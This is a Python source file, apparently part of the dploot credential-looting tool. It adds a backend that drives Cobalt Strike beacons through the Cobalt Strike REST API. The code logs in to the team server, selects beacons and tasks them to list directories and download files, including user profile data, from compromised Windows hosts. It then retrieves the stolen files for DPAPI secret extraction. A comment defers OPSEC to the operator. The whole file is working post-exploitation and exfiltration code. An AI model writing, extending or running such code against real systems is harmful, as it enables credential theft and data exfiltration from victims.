import logging
import argparse
import requests
from time import sleep
from typing import Optional, List, Dict
from urllib3.exceptions import InsecureRequestWarning

from impacket.smb import SharedFile, ATTR_DIRECTORY

from dploot.lib.network import DPLootConnection
from dploot.lib.target import Target


class DPLoootCobaltStrikeConnection(DPLootConnection):
    def __init__(self, target: Target) -> None:
        super().__init__(target)

        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.headers = {}
        self._beacon = None

    def __prepare_path_and_share(self, path, share, isfile=True, double_escape=False):
        # Only for C$, we change the sharename for C:, to make the default dploot
        # work without touching the code to much.
        if self.target.remote_target is None:
            # Doing local stuff
            if share == "C$":
                share = "C:"
        else:
            share = f"\\\\{self.target.remote_target}\\{share}"


        # Adapt path to be compatible with WMI Queries
        if isfile:
            path = f"\\{path}"
        else:
            path = f"\\{path}\\"    
        if double_escape:
            path = path.replace("\\", "\\\\")
        return path, share

    def set_access_token(self, access_token):
        self.headers["Authorization"] = f"Bearer {access_token}"

    def ask_user_dropdown_beacon_selection(self, beacons: List[Dict]):
        from pick import pick
        title = "Please select a beacon to work from"
        beacon, _ = pick(beacons, title)
        return beacon

    def select_beacon(self) -> Dict:
        if self.target.beacon_id is not None:
            # Select beacon with the ID
            res = requests.get(
                url=f"{self.target.cs_api_url}/api/v1/beacons/{self.target.beacon_id}",
                headers = self.headers,
                verify=False,
            )

        else:
            res = requests.get(
                url=f"{self.target.cs_api_url}/api/v1/beacons",
                headers = self.headers,
                verify=False,
            )

        if res.status_code != 200:
            logging.error(f"Error {res.status_code}. Could not list beacons.")
            return None

        beacons = res.json()

        if self.target.beacon_note is not None:
            # Filter beacons list with note
            beacons = [beacon for beacon in beacons if beacon["note"] == self.target.beacon_note]
        
        if len(beacons) <= 0:
            logging.error(f"No beacon available")
            return None
        elif len(beacons) == 1:
            return beacons[0]
        elif isinstance(beacons, Dict):
            # Means there is one beacon
            return beacons
        else:
            return self.ask_user_dropdown_beacon_selection(beacons)
        
        return None

    def wait_for_beacon_task(self, task_id):
        task_result = None
        
        while task_result is None:
            sleep(self.target.wait) # todo maybe set this as an option ?
            res = requests.get(
                url=f"{self.target.cs_api_url}/api/v1/tasks/{task_id}",
                headers=self.headers,
                verify=False,
            )

            if res.status_code == 200:
                if logging.getLogger().level == logging.DEBUG:
                    print(res.json())
                match res.json()["taskStatus"]:
                    case "COMPLETED":
                        logging.debug(f"Task ID {task_id} completed")
                        return res.json()["result"]
                    case "IN_PROGRESS":
                        logging.debug(f"Waiting for Task ID {task_id} result")
                        continue

            if res.status_code == 404:
                logging.debug(f"Still waiting for Task ID {task_id} to be launched")
            else:
                logging.debug(f"Error while requesting Task ID {task_id}: Status code from REST server is {res.status_code}")
                return None
    
    def check_if_file_is_downloaded(self, fullpath):
        res = requests.get(
            url=f"{self.target.cs_api_url}/api/v1/data/downloads",
            headers=self.headers,
            verify=False,
        )
        downloads = res.json()
        downlaod_search = fullpath.rsplit("\\", 1)
        downloaded_file = next(
            (item for item in downloads 
            if item["bid"] == self.beacon["bid"] 
            and item["name"] == downlaod_search[1] 
            and item["path"] == f"{downlaod_search[0]}\\"),
            None)
        return downloaded_file

    def connect(self) -> bool:
        post_data = {
            "username": self.target.cs_username,
            "password": self.target.cs_password,
            "duration_ms": 86400000,
        }
        
        res = requests.post(
            url=f"{self.target.cs_api_url}/api/auth/login",
            json=post_data,
            verify=False,
        )

        if res.status_code == 200:
            self.set_access_token(res.json()["access_token"])
            return True

        return False

    def print_connected_info(self) -> None:
        logging.info(f"Connected to Cobalt Strike REST API with Beacon ID {self.beacon['bid']}")
        logging.info(self.beacon)

    def print_connection_error(self) -> None:
        logging.error(f"Could not connect to Cobalt Strike REST API")

    def is_admin(self) -> bool:
        return True # :)

    def list_dir(self, path, share="C$", wildcard=True) -> list[SharedFile]:
        path, share = self.__prepare_path_and_share(path=path, share=share)
        fullpath = f"{share}{path}"
        records = []
        post_data = {"path":fullpath}
        res = requests.post(
            url=f"{self.target.cs_api_url}/api/v1/beacons/{self.beacon['bid']}/execute/ls",
            headers=self.headers,
            json=post_data,
            verify=False
        )

        if res.status_code != 200:
            logging.error(f"Could not list directory {fullpath}")
            
        tasks_result = self.wait_for_beacon_task(res.json()["taskId"])

        for task_res in tasks_result:
            for element in task_res["contents"]:
                record_attribs = 0
                if element["type"] == "dir":
                    record_attribs |= ATTR_DIRECTORY
                mtime = element["modified"]
                records.append(SharedFile(
                        ctime=mtime,
                        atime=mtime,
                        mtime=mtime,
                        wtime=mtime,
                        filesize=element["size"],
                        allocsize=0,
                        attribs=record_attribs,
                        shortname=element["name"],
                        longname=element["name"],
                        ))
        return records

    def read_file(
        self,
        path,
        share = "C$",
        looted_files=None,
        *args, **kwargs
    ) -> bytes:
        path, share = self.__prepare_path_and_share(path=path, share=share)
        fullpath = f"{share}{path}"
        downloaded_file = None
        # First check if already downloaded
        downloaded_file = self.check_if_file_is_downloaded(fullpath)

        if downloaded_file is None:
            # If not then download
            post_data = {"path":fullpath}
            res = requests.post(
                url=f"{self.target.cs_api_url}/api/v1/beacons/{self.beacon['bid']}/execute/download",
                headers=self.headers,
                json=post_data,
                verify=False,
            )

            if res.status_code != 200:
                logging.error(f"Could not download file {fullpath}")

            tasks_result = self.wait_for_beacon_task(res.json()["taskId"])
            downloaded_file = self.check_if_file_is_downloaded(fullpath)
            
            if downloaded_file is None:
                logging.error(f"Could not download file {fullpath}")
        else:
            logging.debug(f"{fullpath} was already downloaded")

        # Now get the file
        res = requests.get(
            url=f"{self.target.cs_api_url}/api/v1/data/downloads/{downloaded_file['id']}",
            headers=self.headers,
            verify=False
        ) 

        return res.content

    def list_users(self):
        if len(self.target.target_users) > 0:
            logging.info(f"Target usernames list supplied, we can skip listing the usernames.")
            return self.target.target_users
        directories = self.list_dir(path="Users")
        return [d.get_longname() for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]

    def get_dpapi_system_keys(self, looted_files=None) -> Dict[str,bytes]:
        raise NotImplementedError(f"DPLoot won't handle the DPAPI SYSTEM keys recovery for Cobalt Strike collection, you handle the OPSEC. Once recovered, you can fill them with --dpapi-system-key on dploot machinemasterkeys.")

    @property
    def beacon(self) -> Dict:
        if self._beacon is not None:
            return self._beacon

        self._beacon = self.select_beacon()
        return self._beacon

class CobaltStrikeTarget(Target):
    def __init__(self) -> None:
        self.cs_username = None
        self.cs_password = None
        self.cs_api_url = None
        self.beacon_id = None
        self.beacon_note = None
        self.remote_target = None
        self.target_users = []
        self.wait = 5

    @staticmethod
    def from_options(options) -> "Target":
        return CobaltStrikeTarget.create(
            cs_username=options.cs_username if options.cs_username is not None else "",
            cs_password=options.cs_password if options.cs_password is not None else "",
            cs_api_url=options.cs_api_url,
            beacon_id=options.beacon_id,
            beacon_note=options.beacon_note,
            remote_target=options.remote_target,
            target_users=options.target_users,
            wait=options.wait,
        )

    @staticmethod
    def create(
        cs_username: str = "",
        cs_password: str = "",
        cs_api_url: str = "",
        beacon_id: Optional[str] = None,
        beacon_note: Optional[str] = None,
        remote_target: Optional[str] = None,
        target_users: List = [],
        wait: int = 5,
    ) -> "Target":
        self = CobaltStrikeTarget()
        self.protocol = "cobaltstrike"

        self.cs_username = cs_username
        self.cs_password = cs_password
        self.cs_api_url = cs_api_url
        self.beacon_id = beacon_id
        self.beacon_note = beacon_note
        self.remote_target = remote_target
        self.target_users = target_users
        self.wait = wait

        self.address = self.cs_api_url

        return self

    @staticmethod
    def add_network_argument_group(
    parser: argparse.ArgumentParser,
) -> None:
        group = parser.add_argument_group("cobaltstrike args")
        group.add_argument(
            "--cs-username",
            metavar="username",
            dest="cs_username",
            action="store",
            default="dploot",
            help="Username used to connect to Cobalt Strike REST API. Default to dploot.",
        )

        group.add_argument(
            "--cs-password",
            metavar="password",
            dest="cs_password",
            action="store",
            help="Password used to connect to Cobalt Strike REST API.",
        )

        group.add_argument(
            "--rest-url",
            metavar="https://127.0.0.1:50443",
            dest="cs_api_url",
            action="store",
            help="URL to connect to Cobalt Strike REST API.",
        )

        group.add_argument(
            "--beacon-id",
            metavar="id",
            dest="beacon_id",
            action="store",
            help="Beacon ID of the Beacon to use.",
        )

        group.add_argument(
            "--beacon-note",
            metavar="note text",
            dest="beacon_note",
            action="store",
            help="Beacon note of the Beacon to use. If correspond to multiple beacon, will ask user through interactive selection",
        )

        group.add_argument(
            "--target-host",
            action="store",
            dest="remote_target",
            metavar="<target name or address>",
            help="Target IP, FQDN or hostname. If empty, will target local computer",
        )

        group.add_argument(
            "--wait",
            metavar="seconds",
            dest="wait",
            action="store",
            default=5,
            help="When waiting for task to complete, to task status will be requested every X seconds. Default 5 seconds",
        )

        group.add_argument(
            "--target-users",
            nargs="*",
            dest="target_users",
            default=[],
            help="Usernames to target as they are written in C:\\Users\\ directory. If supplied, will skip listing the usernames on the target",
        )

    def create_connection_object(self):
        return DPLoootCobaltStrikeConnection(self)